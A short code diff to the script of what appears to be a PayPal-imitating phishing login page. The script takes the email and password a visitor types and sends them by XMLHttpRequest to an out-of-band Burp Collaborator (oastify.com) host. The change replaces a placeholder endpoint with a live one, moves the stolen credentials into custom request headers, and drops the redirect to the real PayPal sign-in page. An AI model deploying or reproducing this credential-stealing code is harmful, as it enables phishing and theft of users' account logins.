@@ -26,15 +26,11 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             const xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://burp-collaborator.net/your-unique-id', true);
+            xhr.open('POST', 'https://r3v0pmkgomjsvaqclfiar70ao1usih.oastify.com', true);
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    // Redirect to PayPal only after credentials are sent
-                    window.location.href = 'https://www.paypal.com/signin';
-                }
-            };
-            xhr.send(`email=${email}&password=${password}`);
+            xhr.setRequestHeader('Email', email);
+            xhr.setRequestHeader('Password', password);
+            xhr.send();
         };
     </script>
 </body>
